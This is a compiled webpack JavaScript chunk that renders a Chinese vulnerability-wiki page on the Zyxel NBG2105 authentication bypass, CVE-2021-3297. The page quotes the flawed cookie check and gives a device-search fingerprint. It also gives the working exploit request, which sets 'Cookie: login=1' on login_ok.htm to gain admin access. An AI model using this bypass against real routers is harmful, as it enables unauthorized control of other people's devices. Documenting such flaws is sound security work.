(window.webpackJsonp=window.webpackJsonp||[]).push([[195],{1444:function(s,t,a){s.exports=a.p+"assets/img/zyxel-5.9b8b644b.png"},1445:function(s,t,a){s.exports=a.p+"assets/img/zyxel-6.45859bbd.png"},1446:function(s,t,a){s.exports=a.p+"assets/img/zyxel-7.ae01c50f.png"},2891:function(s,t,a){"use strict";a.r(t);var e=a(64),n=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"zyxel-nbg2105-身份验证绕过-cve-2021-3297"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#zyxel-nbg2105-身份验证绕过-cve-2021-3297"}},[s._v("#")]),s._v(" Zyxel NBG2105 身份验证绕过 CVE-2021-3297")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Zyxel NBG2105")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('app="ZyXEL-NBG2105"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登录页面如下")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1444),alt:"img"}})]),s._v(" "),t("p",[s._v("其中前端文件 "),t("code",[s._v("/js/util_gw.js")]),s._v(" 存在前端对 Cookie login参数的校验")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1445),alt:"img"}})]),s._v(" "),t("p",[s._v("可以看到检测到 Cookie中的 "),t("code",[s._v("login=1")]),s._v(" 则跳转 home.html")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("function setCookie() //login_ok.htm use\n{\n\tdocument.cookie=\"login=1\";\n\tMM_goToURL('parent', 'home.htm');\n}\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("请求如下则会以管理员身份跳转到 "),t("code",[s._v("home.htm页面")])]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("http://xxx.xxx.xxx.xxx/login_ok.htm\n\nCookie: login=1;\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1446),alt:"img"}})]),s._v(" "),t("h2",{attrs:{id:""}},[t("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])])],1)}),[],!1,null,null,null);t.default=n.exports}}]);